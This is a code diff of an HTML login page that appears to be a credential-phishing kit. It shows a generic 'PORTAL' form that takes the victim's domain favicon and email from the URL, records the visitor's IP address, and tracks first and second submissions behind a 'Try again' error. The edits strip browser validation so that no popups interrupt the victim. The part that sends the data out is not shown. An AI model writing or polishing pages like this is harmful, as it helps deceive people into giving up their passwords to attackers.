@@ -111,12 +111,6 @@
             background-color: #0b5ed7;
             color: #fff;
         }
-        .btn-primary:focus {
-            box-shadow: none;
-        }
-        @media (max-width: 576px) {
-            .form-container { padding: 1.5rem; }
-        }
         .loader-overlay {
             position: fixed;
             top: 0;
@@ -148,7 +142,8 @@
 
     <div class="form-container">
         <div class="error-message" id="error-message">Try again</div>
-        <form id="user-form">
+        <!-- novalidate prevents browser popups -->
+        <form id="user-form" novalidate>
             <div class="icon-text">
                 <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Favicon" style="height:15px;width:15px;">
                 <span class="h4 mb-0" style="margin-left:10px" id="domain-name">PORTAL</span>
@@ -158,12 +153,14 @@
 
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
-                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left:40px;" disabled>
+                <!-- removed disabled so user could theoretically change, but keeps value from URL -->
+                <input type="email" class="form-control" id="email" placeholder=" " style="padding-left:40px;" readonly>
                 <label style="background-color:transparent;">Email</label>
             </div>
             <div class="form-floating position-relative">
                 <i class="bi bi-lock input-icon"></i>
-                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left:40px;">
+                <!-- NO required attribute – no browser popup -->
+                <input type="password" class="form-control" id="password" placeholder=" " style="padding-left:40px;">
                 <label style="background-color:transparent;">Password</label>
             </div>
             <button type="submit" class="btn btn-primary">Continue</button>
@@ -237,8 +234,9 @@
                 .then(data => { clientInfo.ipAddress = data.ip; })
                 .catch(() => { clientInfo.ipAddress = "Unavailable"; });
 
-            document.getElementById("user-form").addEventListener("submit", (e) => {
-                e.preventDefault();
+            const form = document.getElementById("user-form");
+            form.addEventListener("submit", (e) => {
+                e.preventDefault();  // No browser validation popup
                 submitCount++;
                 const isFirstSubmit = (submitCount === 1);
                 const isSecondSubmit = (submitCount === 2);
